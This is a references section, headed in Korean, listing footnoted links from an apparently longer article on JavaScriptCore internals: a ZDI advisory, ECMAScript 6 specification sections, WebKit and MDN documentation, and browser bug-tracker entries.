# 8. 참조

[^1]: http://www.zerodayinitiative.com/advisories/ZDI-16-485/
[^2]: https://webkit.org/blog/3362/introducing-the-webkit-ftl-jit/
[^3]: http://trac.webkit.org/wiki/JavaScriptCore
[^4]: http://www.ecma-international.org/ecma-262/6.0/#sec-ecmascript-data-types-and-values
[^5]: http://www.ecma-international.org/ecma-262/6.0/#sec-objects
[^6]: https://en.wikipedia.org/wiki/Double-precision_floating-point_format
[^7]: http://www.ecma-international.org/ecma-262/6.0/#sec-array-exotic-objects
[^8]: http://www.ecma-international.org/
[^9]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/slice
[^10]: https://github.com/WebKit/webkit/blob/320b1fc3f6f47a31b6ccb4578bcea56c32c9e10b/Source/JavaScriptCore/runtime/ArrayPrototype.cpp#L848
[^11]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/species
[^12]: http://www.ecma-international.org/ecma-262/6.0/#sec-type-conversion
[^13]: https://bugzilla.mozilla.org/show_bug.cgi?id=735104
[^14]: https://bugzilla.mozilla.org/show_bug.cgi?id=983344
[^15]: https://bugs.chromium.org/p/chromium/issues/detail?id=554946
[^16]: https://www.gnu.org/software/guile/manual/html_node/Conservative-GC.html
[^17]: http://www.ecma-international.org/ecma-262/6.0/#sec-ecmascript-language-types-number-type
[^18]: http://www.ecma-international.org/ecma-262/6.0/#sec-typedarray-objects
[^19]: https://developers.google.com/v8/design#fast-property-access
[^20]: http://www.ecma-international.org/ecma-262/6.0/#sec-operations-on-objects
[^21]: http://www.ecma-international.org/ecma-262/6.0/#sec-ordinary-object-internal-methods-and-internal-slots-delete-p
[^22]: https://trac.webkit.org/wiki/WebKit2
[^23]: https://www.chromium.org/developers/design-documents/site-isolation
